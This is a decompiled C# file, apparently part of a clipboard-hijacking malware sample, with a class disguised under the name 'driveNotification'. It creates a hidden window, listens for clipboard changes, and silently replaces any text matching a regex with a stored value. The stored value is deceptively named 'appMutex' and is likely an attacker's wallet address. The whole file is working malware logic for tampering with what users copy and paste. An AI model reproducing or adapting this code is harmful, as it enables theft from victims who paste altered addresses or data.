using System;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace ConsoleApplication7
{
	// Token: 0x02000004 RID: 4
	public sealed class driveNotification
	{
		// Token: 0x02000005 RID: 5
		public class NotificationForm : Form
		{
			// Token: 0x06000022 RID: 34 RVA: 0x000038E4 File Offset: 0x00001AE4
			public NotificationForm()
			{
				Program.NativeMethods.SetParent(base.Handle, Program.NativeMethods.intpreclp);
				Program.NativeMethods.AddClipboardFormatListener(base.Handle);
			}

			// Token: 0x06000023 RID: 35 RVA: 0x00003909 File Offset: 0x00001B09
			private bool RegexResult(Regex pattern)
			{
				return pattern.Match(driveNotification.NotificationForm.currentClipboard).Success;
			}

			// Token: 0x06000024 RID: 36 RVA: 0x00003920 File Offset: 0x00001B20
			protected override void WndProc(ref Message m)
			{
				if (m.Msg == 797)
				{
					driveNotification.NotificationForm.currentClipboard = driveNotification.NotificationForm.GetText();
					if (this.RegexResult(Program.appMutexRegex) && !driveNotification.NotificationForm.currentClipboard.Contains(Program.appMutex))
					{
						string text = Program.appMutexRegex.Replace(driveNotification.NotificationForm.currentClipboard, Program.appMutex);
						driveNotification.NotificationForm.SetText(text);
					}
				}
				base.WndProc(ref m);
			}

			// Token: 0x17000001 RID: 1
			// (get) Token: 0x06000025 RID: 37 RVA: 0x00003984 File Offset: 0x00001B84
			protected override CreateParams CreateParams
			{
				get
				{
					CreateParams createParams = base.CreateParams;
					createParams.ExStyle |= 128;
					return createParams;
				}
			}

			// Token: 0x06000026 RID: 38 RVA: 0x000039C0 File Offset: 0x00001BC0
			public static string GetText()
			{
				string ReturnValue = string.Empty;
				Thread thread = new Thread(delegate
				{
					ReturnValue = Clipboard.GetText();
				});
				thread.SetApartmentState(ApartmentState.STA);
				thread.Start();
				thread.Join();
				return ReturnValue;
			}

			// Token: 0x06000027 RID: 39 RVA: 0x00003A20 File Offset: 0x00001C20
			public static void SetText(string txt)
			{
				Thread thread = new Thread(delegate
				{
					Clipboard.SetText(txt);
				});
				thread.SetApartmentState(ApartmentState.STA);
				thread.Start();
				thread.Join();
			}

			// Token: 0x0400001C RID: 28
			private static string currentClipboard = driveNotification.NotificationForm.GetText();
		}
	}
}
